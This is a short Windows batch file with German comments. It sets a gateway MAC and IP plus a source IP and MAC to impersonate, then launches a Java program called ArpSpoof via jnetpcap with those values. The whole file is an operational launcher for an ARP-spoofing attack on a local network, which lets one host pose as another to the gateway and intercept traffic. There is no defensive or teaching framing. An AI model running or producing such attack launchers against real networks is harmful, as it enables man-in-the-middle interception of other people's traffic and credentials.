@echo off
setlocal

REM MAC vom Gateway
SET dst_mac = cc:35:40:2a:d6:fd

REM ausgeben als IP
SET src_ip = 192.168.0.12

REM ausgeben als MAC
SET src_mac = 60:02:B4:B8:61:EC

REM IP vom Gateway
SET dst_ip = 192.168.0.1

java -cp .;jnetpcap.jar ArpSpoof %dst_mac % %src_ip % %src_mac % %dst_ip %

endlocal

pause